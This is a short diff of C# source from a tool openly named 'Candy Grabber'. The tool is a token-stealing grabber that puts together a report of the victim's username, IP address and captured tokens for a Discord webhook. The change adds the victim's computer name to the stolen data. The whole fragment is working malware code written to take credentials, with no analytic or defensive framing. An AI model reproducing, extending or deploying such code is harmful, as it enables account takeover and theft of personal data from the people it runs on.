@@ -66,7 +66,7 @@ namespace candy_grabber
             {
                 { "username", "Candy Grabber by goldblack" },
                 { "avatar_url", "https://cdn.discordapp.com/attachments/696080024742395914/718483498947838063/beetlejuice-1.jpg" },
-                { "content", "```\n" + "Report from Candy Grabber\n\n" + "Username: " + Environment.UserName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", message) + "\n\nLast one is correct" + "\n```" }
+                { "content", "```\n" + "Report from Candy Grabber\n\n" + "Username: " + Environment.UserName + "\nComputerName: " + Environment.MachineName + "\nIP: " + GetIP() + "\nTokens:\n\n" + string.Join("\n", message) + "\n\nLast one is correct" + "\n```" }
             });
         }
     }
